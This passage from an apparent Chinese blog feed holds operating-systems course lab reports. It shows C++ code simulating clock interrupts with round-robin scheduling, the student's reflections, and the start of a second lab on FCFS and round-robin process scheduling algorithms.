class="hljs-comment">//剩余区间时间</span><br>&#125; proc[N];<br><br>queue &lt;process&gt; ready; <span class="hljs-comment">//就绪队列</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp_FCFS</span><span class="hljs-params">(process a, process b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (a.arrive != b.arrive)<br><span class="hljs-keyword">return</span> a.arrive &lt; b.arrive;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> a.id &lt; b.id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入进程个数：&quot;</span>;<br>cin &gt;&gt; n;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入时间片大小：&quot;</span>;<br>cin &gt;&gt; q;<br>temp_q = q;<br>cout &lt;&lt; <span class="hljs-string">&quot;请按进程到达先后输入进程信息（1~n）：到达时间 区间时间&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//要求按到达先后顺序输入，以便于到达时间相同时判断先后</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;:&quot;</span>;<br>cin &gt;&gt; proc[i].arrive &gt;&gt; proc[i].work;<br><span class="hljs-comment">//信息初始化</span><br>proc[i].id = i;<br>proc[i].in = <span class="hljs-number">0</span>;<br>proc[i].begin = <span class="hljs-number">-1</span>; <span class="hljs-comment">//表示还没开始</span><br>proc[i].finish = <span class="hljs-number">0</span>;<br>proc[i].rest = proc[i].work;<br>&#125;<br><span class="hljs-built_in">sort</span>(proc, proc + n + <span class="hljs-number">1</span>, cmp_FCFS);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>proc[i].pos = i;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp_id</span><span class="hljs-params">(process a, process b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> a.id &lt; b.id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RR_one</span><span class="hljs-params">(<span class="hljs-type">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) <span class="hljs-comment">//遍历所有进程</span><br>&#123;<br><span class="hljs-keyword">if</span> (!proc[i].in &amp;&amp; proc[i].arrive == timer) <span class="hljs-comment">//若有进程还没有进入过就绪队列，且当前到达</span><br>&#123;<br>proc[i].in = <span class="hljs-number">1</span>; <span class="hljs-comment">//更改标记</span><br>ready.<span class="hljs-built_in">push</span>(proc[i]); <span class="hljs-comment">//进入就绪队列</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!ready.<span class="hljs-built_in">empty</span>())<br>&#123;<br>process t = ready.<span class="hljs-built_in">front</span>();<br>ready.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">if</span> (t.begin == <span class="hljs-number">-1</span>)<br>&#123;<br>t.begin = timer;<br>&#125;<br>temp_q--;<br>t.rest--;<br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; t.id &lt;&lt; <span class="hljs-string">&quot;正在运行...&quot;</span>;<br><span class="hljs-keyword">if</span> (t.rest == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;该进程已完成&quot;</span>;<br>t.end = timer + <span class="hljs-number">1</span>; <span class="hljs-comment">//完成时间=最新的当前时间</span><br>t.finish = <span class="hljs-number">1</span>; <span class="hljs-comment">//更新标记：已完成</span><br>t.turnaround = t.end - t.arrive; <span class="hljs-comment">//周转时间=完成时间-到达时间</span><br>t.wait = t.turnaround - t.work; <span class="hljs-comment">//等待时间=周转时间-区间时间</span><br>proc[t.pos] = t; <span class="hljs-comment">//更新（已完成的）进程信息</span><br>&#125;<br><span class="hljs-keyword">if</span> (temp_q == <span class="hljs-number">0</span>) <span class="hljs-comment">//当前时间片用完</span><br>&#123;<br><span class="hljs-keyword">if</span> (t.rest &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//未完成则入就绪队列</span><br>&#123;<br>ready.<span class="hljs-built_in">push</span>(t);<br>&#125;<br>temp_q = q;<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sort</span>(proc, proc + n + <span class="hljs-number">1</span>, cmp_id);<br>cout &lt;&lt; <span class="hljs-string">&quot;所有进程当前状态如下：&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; <span class="hljs-string">&quot;进程编号&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;到达时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;区间时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;开始时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<br>         <span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;完成时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;周转时间&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;等待时间&quot;</span>;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].id &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].arrive &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].work;<br><span class="hljs-keyword">if</span> (proc[i].begin != <span class="hljs-number">-1</span>)<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].begin;<br><span class="hljs-keyword">else</span><br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;未开始&quot;</span>;<br><span class="hljs-keyword">if</span> (proc[i].finish)<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].end &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].turnaround &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; proc[i].wait;<br><span class="hljs-keyword">else</span><br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;未完成&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;未完成&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;未完成&quot;</span>;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-type">time_t</span> st = <span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//基于当前系统的开机时间，自 1970 年 1 月 1 日以来经过的秒数。</span><br><span class="hljs-type">char</span> *s_st = <span class="hljs-built_in">ctime</span>(&amp;st); <span class="hljs-comment">//将开机时间转化为字符串形式;</span><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间为：&quot;</span> &lt;&lt; s_st;<br><span class="hljs-comment">//格式为：Www Mmm dd hh:mm:ss yyyy</span><br><span class="hljs-comment">//其中，Www 表示星期几，Mmm 是以字母表示的月份，dd 表示一月中的第几天，hh:mm:ss 表示时间，yyyy 表示年份。</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-type">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-type">int</span> wr;<span class="hljs-comment">//键盘输入信息</span><br><span class="hljs-type">int</span> time_alarm; <span class="hljs-comment">//定时闹钟</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入定时闹钟：&quot;</span>;<br>cin &gt;&gt; time_alarm; <span class="hljs-comment">//置定时闹钟 （毫秒）</span><br><span class="hljs-keyword">while</span> (time_alarm != <span class="hljs-number">0</span>) <span class="hljs-comment">//当定时时钟不为0</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;执行了一条指令...&quot;</span> &lt;&lt; endl;<br>count++; <span class="hljs-comment">//计数器加1</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入模拟的时钟中断信号：&quot;</span>;<br>cin &gt;&gt; wr; <span class="hljs-comment">//读入键盘输入信息</span><br><span class="hljs-keyword">if</span> (wr == <span class="hljs-number">1</span>) <span class="hljs-comment">//如果有时钟中断</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;时钟中断，保存现场...&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">RR_one</span>(timer);<br>timer++; <span class="hljs-comment">//计时器加1；</span><br>time_alarm--; <span class="hljs-comment">//定时闹钟减1；</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//定时闹钟为0，结束循环，接下来计算当前日历时钟。</span><br><span class="hljs-type">int</span> p; <span class="hljs-comment">//距离开机时间经过的时间（单位：毫秒）</span><br>p = timer * <span class="hljs-number">20</span>;<br><span class="hljs-type">time_t</span> now = st + p / <span class="hljs-number">1000</span>; <span class="hljs-comment">// 当前时间自 1970 年 1 月 1 日以来经过的秒数</span><br><span class="hljs-type">char</span> *s_now = <span class="hljs-built_in">ctime</span>(&amp;now);<span class="hljs-comment">//将当前时间转化为字符串形式</span><br>cout &lt;&lt; <span class="hljs-string">&quot;当前时间为：&quot;</span> &lt;&lt; s_now;<br><span class="hljs-built_in">display</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="程序运行时的初值和运行结果-1"><a href="#程序运行时的初值和运行结果-1" class="headerlink" title="程序运行时的初值和运行结果"></a>程序运行时的初值和运行结果</h3><h4 id="初值"><a href="#初值" class="headerlink" title="初值"></a>初值</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/202112042236896-163862949446912.png" alt="image-20211113102428868"></p><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/202112042236897.png" alt="image-20211113102555653"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ul><li>本次实验让我通过编写模拟程序，进一步了解中断及中断处理程序的作用。在编程过程中，我接触到了C++中<code>&lt;ctime&gt;</code>这个时间相关库，学会通过<code>time_t st = time(0)</code>得到基于当前系统的开机时间（自 1970 年 1 月 1 日以来经过的秒数），再使用<code>ctime(&amp;st)</code>将该时间转化为字符串形式（格式为：<code>Www Mmm dd hh:mm:ss yyyy</code>）。而对于中断的模拟是基于定时时钟的<code>while</code>循环。此外，我进行了拓展。一是，通过信息输入，再对时间的tm结构的处理，可以自己设定开机时间（见源程序末尾的注释）。二是完成了思考题，将处理器调度和时间中断相结合，刚好地了解中断的运行机制，并有效提高了编程能力。</li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++编程实现进程调度算法</title>
    <link href="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/"/>
    <url>/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="实验二-进程调度算法的设计"><a href="#实验二-进程调度算法的设计" class="headerlink" title="实验二 进程调度算法的设计"></a>实验二 进程调度算法的设计</h1><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><ol><li><p>先来先服务（FCFS）调度算法</p><ul><li><p>原理：每次调度是从就绪队列中，选择一个最先进入就绪队列的进程，把处理器分配给该进程，使之得到执行。该进程一旦占有了处理器，它就一直运行下去，直到该进程完成或因发生事件而阻塞，才退出处理器。</p></li><li><p>将用户作业和就绪进程按提交顺序或变为就绪状态的先后排成队列，并按照先来先服务的方式进行调度处理，是一种最普遍和最简单的方法。它优先考虑在系统中等待时间最长的作业，而不管要求运行时间的长短。</p></li><li><p>按照就绪进程进入就绪队列的先后次序进行调度，简单易实现，利于长进程，CPU繁忙型作业，不利于短进程，排队时间相对过长。</p><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211111101042496-16386246286605.png" alt="image-20211111101042496"></p></li></ul></li><li><p>时间片轮转调度算法RR</p><ul><li>原理：时间片轮转法主要用于进程调度。采用此算法的系统，其程序就绪队列往往按进程到达的时间来排序。进程调度按一定时间片(q)轮番运行各个进程。</li><li>进程按到达时间在就绪队列中排队，调度程序每次把CPU分配给就绪队列首进程使用一个时间片，运行完一个时间片释放CPU，排到就绪队列末尾参加下一轮调度，CPU分配给就绪队列的首进程。</li></ul><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211111182747792-16386243688573.png" alt="image-20211111182747792"></p><ul><li>固定时间片轮转法：<ol><li>所有就绪进程按 FCFS 规则排队。</li><li>处理机总是分配给就绪队列的队首进程。</li><li>如果运行的进程用完时间片，则系统就把该进程送回就绪队列的队尾，重新排队。</li><li>因等待某事件而阻塞的进程送到阻塞队列。</li><li>系统把被唤醒的进程送到就绪队列的队尾</li></ol></li><li><p>可变时间片轮转法：</p><ol><li><p>进程状态的转换方法同固定时间片轮转法。</p></li><li><p>时间片的长短依据就绪队列进程数量的多少由$T=N*(q+t)$的关系调整（T为响应时间（固定），N为就绪队列进程数，q为时间片的长短，t为上下文切换时间。其中q为毫秒级及以上，上下文切换时间t为纳秒级而忽略不计）。即就绪队列进程数有变化时，时间片需要调整。</p><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%BA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1/image-20211112102915716-16386246370376.png" alt="image-20211112102915716"></p></li></ol></li></ul></li></ol><h2 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h2><ul><li><p>结构体表示进程，结构体数组记录各个进程的信息：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">process</span><br>&#123;<br><span class="hljs-type">int</span> id; <span class="hljs-comment">//编号</span><br><span class="hljs-type">int</span> pos; <span class="hljs-comment">//排序后的位置</span><br><span class="hljs-type">int</span> arrive; <span class="hljs-comment">//到达时间</span><br><span class="hljs-type">int</span> work; <span class="hljs-comment">//区间时间</span><br><span class="hljs-type">int</span> begin; <span class="hljs-comment">//开始时间</span><br><span class="hljs-type">int</span> end; <span class="hljs-comment">//完成时间</span><br><span class="hljs-type">int</span> turnaround; <span class="hljs-comment">//周转时间</span><br><span class="hljs-type">int</span> wait; <span class="hljs-comment">//等待时间</span><br><span class="hljs-type">bool</span> in; <span class="hljs-comment">//是否进入过就绪队列</span><br><span class="hljs-type">bool</span> finish; <span class="hljs-comment">//是否完成</span><br><span class="hljs-type">int</span> rest; <span class="hljs-comment">//剩余区间时间（RR）</span><br><span class="hljs-type">int</span> block_p; <span class="hljs-comment">//最近一次被阻塞的时间点</span><br><span class="hljs-type">int</span> <span class="hljs-type">block_t</span>; <span class="hljs-comment">//阻塞时间长度（RR）</span><br>&#125; proc[N];<br></code></pre></div></td></tr></table></figure></li><li><p>使用数据结构queue（队列）:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">queue &lt;process&gt; ready; <span class="hljs-comment">//就绪队列</span><br>queue &lt;process&gt; block; <span class="hljs-comment">//阻塞队列（RR）</span><br>queue &lt;process&gt; block_new; <span class="hljs-comment">//(临时)新阻塞队列,用于阻塞队列的更新（RR）</span><br></code></pre></div></td></tr></table></figure></li><li><p>整型变量：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//全局变量</span><br><span class="hljs-type">int</span> k, k_RR, n, q;<br><span class="hljs-comment">/* k：算法类型（0:FCFS 1:RR）</span><br><span class="hljs-comment">k_RR：RR算法类型（0:时间片固定 1:可变）</span><br><span class="hljs-comment">n：进程数</span><br><span class="hljs-comment">q：时间片</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> now = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><br><span class="hljs-comment">//FCFS_And_RR函数内部</span><br><span class="hljs-type">int</span> left = n; <span class="hljs-comment">//剩余的未完成进程数</span><br><span class="hljs-type">int</span> once_max; <span class="hljs-comment">//一个时间片内一个进程最大运行时间</span><br><span class="hljs-type">int</span> once; <span class="hljs-comment">//记录一个时间片内的运行时间</span><br><span class="hljs-type">int</span> min_arrive = <span class="hljs-number">0x3f3f3f</span>; <span class="hljs-comment">//未到达进程的最小到达时间（可能有多个进程）</span><br><span class="hljs-type">int</span> in_flag = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间是否有进程入就绪队列</span><br></code></pre></div></td></tr></table></figure></li><li><p>函数：</p><p><code>bool cmp_FCFS(process a, process b)</code>：FCFS规则排队的比较函数；</p><p><code>bool cmp_id(process a, process b)</code>：按编号顺序的排序函数</p><p><code>void init()</code> :输入信息进行初始化的函数</p><p><code>void block_check()</code>: 查看阻塞队列中是否有进程被唤醒的函数</p><p><code>void FCFS_And_RR()</code>:FCFS调度算法和RR调度算法的函数</p><p><code>void display()</code>：用于输出结果的函数</p></li></ul><h2 id="源程序及注释："><a href="#源程序及注释：" class="headerlink" title="源程序及注释："></a>源程序及注释：</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 100001</span><br><span class="hljs-comment">//算法类型（0:FCFS 1:RR），RR算法类型（0:时间片固定 1:可变）,进程数，时间片</span><br><span class="hljs-type">int</span> k, k_RR, n, q;<br><br><span class="hljs-type">int</span> now = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">process</span><br>&#123;<br><span class="hljs-type">int</span> id; <span class="hljs-comment">//编号</span><br><span class="hljs-type">int</span> pos; <span class="hljs-comment">//排序后的位置</span><br><span class="hljs-type">int</span> arrive; <span class="hljs-comment">//到达时间</span><br><span class="hljs-type">int</span> work; <span class="hljs-comment">//区间时间</span><br><span class="hljs-type">int</span> begin; <span class="hljs-comment">//开始时间</span><br><span class="hljs-type">int</span> end; <span class="hljs-comment">//完成时间</span><br><span class="hljs-type">int</span> turnaround; <span class="hljs-comment">//周转时间</span><br><span class="hljs-type">int</span> wait; <span class="hljs-comment">//等待时间</span><br><span class="hljs-type">bool</span> in; <span class="hljs-comment">//是否进入过就绪队列</span><br><span class="hljs-type">bool</span> finish; <span class="hljs-comment">//是否完成</span><br><span class="hljs-type">int</span> rest; <span class="hljs-comment">//剩余区间时间</span><br><span class="hljs-type">int</span> block_p; <span class="hljs-comment">//最近一次被阻塞的时间点</span><br><span class="hljs-type">int</span> <span class="hljs-type">block_t</span>; <span class="hljs-comment">//阻塞时间长度</span><br>&#125; proc[N];<br>queue &lt;process&gt; ready; <span class="hljs-comment">//就绪队列</span><br>queue &lt;process&gt; block; <span class="hljs-comment">//阻塞队列（RR）</span><br>queue &lt;process&gt; block_new; <span class="hljs-comment">//(临时)新阻塞队列,用于阻塞队列的更新（RR）</span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span 